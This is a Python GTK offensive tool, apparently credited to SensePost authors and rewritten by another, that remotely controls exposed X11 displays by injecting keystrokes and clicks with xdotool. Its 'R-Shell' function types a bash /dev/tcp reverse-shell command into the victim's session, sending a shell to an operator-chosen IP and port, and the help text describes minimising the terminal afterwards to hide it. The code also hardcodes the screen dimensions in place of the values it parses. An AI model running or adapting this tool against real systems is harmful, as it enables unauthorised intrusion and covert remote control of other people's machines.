#!/usr/bin/python3
#
# xrdp.py - X11 Remote Desktop
# =====================================
#
# Authors:
# darryn@sensepost.com
# thomas@sensepost.com
#

import os
import sys
import subprocess
import time
import re
import cairo
import gi
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, Gdk, GLib
import socket

class xwin:
    host = ''
    xww = None
    keyspace = {' ':'space', '!':'exclam', '"':'quotedbl', '#':'numbersign', '$':'dollar', '%':'percent', '&':'ampersand', '\'':'quoteright', '(':'parenleft', ')':'parenright', '[':'bracketleft', '*':'asterisk', '\\':'backslash', '+':'plus', ']':'bracketright', ',':'comma', '^':'asciicircum', '-':'minus', '_':'underscore', '.':'period', '`':'quoteleft', '/':'slash', ':':'colon', ';':'semicolon', '<':'less', '=':'equal', '>':'greater', '?':'question', '@':'at', '{':'braceleft', '|':'bar', '}':'braceright', '~':'asciitilde'}
    spr_state = False
    ctrl_state = False
    alt_state = False

    def on_click(self, widget, event):
        cmd = f'export DISPLAY={self.host} && xdotool mousemove {event.x} {event.y}'
        if (event.button == Gdk.BUTTON_PRIMARY):
            cmd += ' click 1'
        elif (event.button == Gdk.BUTTON_SECONDARY):
            cmd += ' click 3'
        os.system(cmd)

    def string_to_xdo(self, st, entry):
        if (len(st) == 0):
            return 'Return'
        st = list(st)
        out = ''
        for ch in st:
            if ch in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890':
                out += ch + ' '
            else:
                out += self.keyspace[ch] + ' '

        if ((len(out) > 2) and (self.spr_state or self.ctrl_state or self.alt_state)):
            entry.set_text('SUPER or CTRL or ALT are toggled. Only one character please.')
            return ''
        elif (self.spr_state and self.ctrl_state and self.alt_state):
            out = 'super+ctrl+alt+' + out
        elif (self.spr_state and self.ctrl_state):
            out = 'super+ctrl+' + out
        elif (self.spr_state and self.alt_state):
            out = 'super+alt+' + out
        elif (self.ctrl_state and self.alt_state):
            out = 'ctrl+alt+' + out
        elif (self.spr_state):
            out = 'super+' + out
        elif (self.ctrl_state):
            out = 'ctrl+' + out
        elif (self.alt_state):
            out = 'alt+' + out

        self.spr_state = False
        self.ctrl_state = False
        self.alt_state = False

        return out

    def on_shell_clicked(self, button, entry):
        entry_text = entry.get_text()
        entry.set_text("")
        if (len(entry_text) == 0):
            entry.set_text("IP:Port")
            return
        if ' ' in entry_text:
            dest = entry_text.split(' ')
        else:
            dest = entry_text.split(':')
        # Launch reverse shell
        cmd = f'echo "exec 5<>/dev/tcp/{dest[0]}/{dest[1]} && cat <&5 | /bin/bash 2>&5 >&5" | /bin/bash'
        cmd = f'export DISPLAY={self.host} && xdotool key {self.string_to_xdo(cmd, entry)}'
        os.system(cmd)
        time.sleep(5)
        cmd = f'export DISPLAY={self.host} && xdotool key Return'
        os.system(cmd)

    def on_backspace_clicked(self, button):
        cmd = f'export DISPLAY={self.host} && xdotool key BackSpace'
        os.system(cmd)

    def on_enter_clicked(self, button):
        cmd = f'export DISPLAY={self.host} && xdotool key Return'
        os.system(cmd)

    def on_button_toggled(self, button, name):
        if (button.get_active()):
            if (name == 'spr'):
                self.spr_state = True
            elif (name == 'ctrl'):
                self.ctrl_state = True
            elif (name == 'alt'):
                self.alt_state = True
        else:
            if (name == 'spr'):
                self.spr_state = False
            elif (name == 'ctrl'):
                self.ctrl_state = False
            elif (name == 'alt'):
                self.alt_state = False

    def enter_callback(self, widget, entry):
        entry_text = entry.get_text()
        entry.set_text("")
        cmd = f'export DISPLAY={self.host} && xdotool key {self.string_to_xdo(entry_text, entry)}'
        os.system(cmd)

    def expose(self, widget, event):
        cr = widget.get_window().cairo_create()
        cr.set_operator(cairo.Operator.CLEAR)
        cr.rectangle(0.0, 0.0, *widget.get_size())
        cr.fill()

    def destroy(self, widget):
        if self.xww:
            os.system(f'kill {self.xww.pid + 1}')
        Gtk.main_quit()

    def delete_event(self, widget, event):
        return False

    def __init__(self, width, height):
        self.window = Gtk.Window()
        self.window.connect("delete-event", self.delete_event)
        self.window.connect("destroy", self.destroy)
        self.window.set_border_width(0)
        self.window.set_size_request(width, height + 30)
        self.window.set_app_paintable(True)

        #self.screen = self.window.get_screen()
        #self.rgba = 0 #self.screen.get_rgba_colormap()
        #self.window.set_colormap(self.rgba)
        
        self.screen = self.window.get_screen()
        self.settings = Gtk.Settings.get_default()
        # Activer l'utilisation de la colormap RGBA
        self.settings.set_property("gtk-application-prefer-dark-theme", True)

        self.vbox = Gtk.VBox(False, 5)
        self.hbox = Gtk.HBox(False, 3)
        self.bbox = Gtk.HBox(True, 3)

        self.entry = Gtk.Entry()
        self.entry.set_max_length(0)
        self.entry.set_size_request(int(width / 2), 25)
        self.entry.connect("activate", self.enter_callback, self.entry)
        self.spr = Gtk.ToggleButton.new_with_label('spr')
        self.spr.connect("toggled", self.on_button_toggled, 'spr')
        self.ctrl = Gtk.ToggleButton.new_with_label('ctrl')
        self.ctrl.connect("toggled", self.on_button_toggled, 'ctrl')
        self.alt = Gtk.ToggleButton.new_with_label('alt')
        self.alt.connect("toggled", self.on_button_toggled, 'alt')
        self.enter = Gtk.Button.new_with_label('Enter')
        self.enter.connect("clicked", self.on_enter_clicked)
        self.backspace = Gtk.Button.new_with_label('Backspace')
        self.backspace.connect("clicked", self.on_backspace_clicked)
        self.shell = Gtk.Button.new_with_label('R-Shell')
        self.shell.connect("clicked", self.on_shell_clicked, self.entry)

        self.hbox.pack_start(self.entry, False, False, 0)
        self.bbox.pack_start(self.spr, True, True, 0)
        self.bbox.pack_start(self.ctrl, True, True, 0)
        self.bbox.pack_start(self.alt, True, True, 0)
        self.bbox.pack_start(self.enter, True, True, 0)
        self.bbox.pack_start(self.backspace, True, True, 0)
        self.bbox.pack_start(self.shell, True, True, 0)
        self.hbox.pack_start(self.bbox, False, False, 0)

        #self.halign = Gtk.Alignment(1, 0, 1, 0)
        self.halign = Gtk.Alignment()

        self.halign.add(self.hbox)

        #self.allalign = Gtk.Alignment(0, 0, 1, 1)
        self.allalign = Gtk.Alignment()
        self.clickbox = Gtk.EventBox()
        self.clickbox.connect('button-press-event', self.on_click)
        self.clickbox.set_visible_window(False)

        self.allalign.add(self.clickbox)
        self.vbox.pack_start(self.allalign, True, True, 0)

        self.vbox.pack_end(self.halign, False, False, 0)

        self.window.add(self.vbox)

        self.window.show_all()

        self.window.move(100, 100)

    def main(self):
        Gtk.main()

def valid_ip(address):
    try:
        socket.inet_aton(address)
        return True
    except:
        return False

def main():
    print("""
                  _       
    __  ___ __ __| |_ __  
    \ \/ / '__/ _` | '_ \ 
     >  <| | | (_| | |_) |
    /_/\_\_|  \__,_| .__/ 
                   |_|    
        X11 Remote Desktop
    """)

    if (len(sys.argv) == 1):
        print("xrdp.py <host>:<dp>")
        print("------------------------")
        print("Example:")
        print("xrdp.py 10.0.0.10:0")
        print("xrdp.py 10.0.0.10:0 --no-disp")
        print("")
        quit()
    elif ((sys.argv[1] == "-h") or (sys.argv[1] == "--help")):
        print('''
xrdp.py - X11 Remote Desktop
=====================================

this is a rudimentary remote desktop tool for the X11 protocol

xrdp.py <host>:<dp>
--------------
 Example: xrdp.py 10.0.0.10:0
          xrdp.py 10.0.0.10:0 --no-disp

requirements:
--------------
 xwininfo
 xwatchwin
 xdotool

usage:
--------------
 --no-disp  = only load the keyboard input fields (do not render display)
 spr        = toggle on/off + type character in entry + press enter to send
 ctrl       = toggle on/off + type character in entry + press enter to send
 alt        = toggle on/off + type character in entry + press enter to send
 Enter      = press button to send enter key
 Backspace  = press button to send backspace key
 R-Shell    = type ip:port in entry + press button = automatically open terminal and run reverse shell then minimize window (ctrl+alt+t -> bashmagic -> ctrl+super+down)

Authors:
darryn@sensepost.com
thomas@sensepost.com
''')
        quit()
    elif (sys.argv[1] == "--authors"):
        print('''
Rewritten by @Wall6e
''')
        quit()

    disp = True

    try:
        inp1 = sys.argv[1]
        inp2 = sys.argv[2]

        if (inp1 == "--no-disp"):
            host = inp2
            disp = False
        elif (inp2 == "--no-disp"):
            host = inp1
            disp = False
    except IndexError:
        host = sys.argv[1]

    valid = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,2}$", host)
    if valid:
        if not valid_ip(host.split(':')[0]):
            print('Invalid IP address.')
            quit()
        if (int(host.split(':')[1]) > 63):
            print('Invalid diplay number.')
            quit()
    else:
        print('Invalid input.')
        quit()

    try:
        xwininfo = f"xwininfo -root -display {host}"
        dpinfo = subprocess.check_output(xwininfo, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)


        winid = re.search(b'Window id: 0x[0-9a-fA-F]+', dpinfo)
        winid = winid.group(0).split(b' ')
        winid = winid[2]

        winwidth = re.search(b'Width: [0-9]+', dpinfo)
        winwidth = winwidth.group(0).split(b' ')
        winwidth = 1536 # int(winwidth[1])

        winheight = re.search(b'Height: [0-9]+', dpinfo)
        winheight = winheight.group(0).split(b' ')
        winheight = 864 # int(winheight[1])

        if disp:
            xwatchwin = f"xwatchwin {host} -w {winid} > /dev/null"
            xww = subprocess.Popen(xwatchwin, shell=True)
            time.sleep(2)

            xwinmove = "xdotool getactivewindow windowmove 100 100"
            os.system(xwinmove)

            overlay = xwin(winwidth, winheight)
            overlay.host = host
            overlay.xww = xww
            overlay.main()
        else:
            overlay = xwin(480, 1)
            overlay.host = host
            overlay.xww = None
            overlay.main()
    except KeyboardInterrupt:
        quit()

if __name__ == '__main__':
    main()


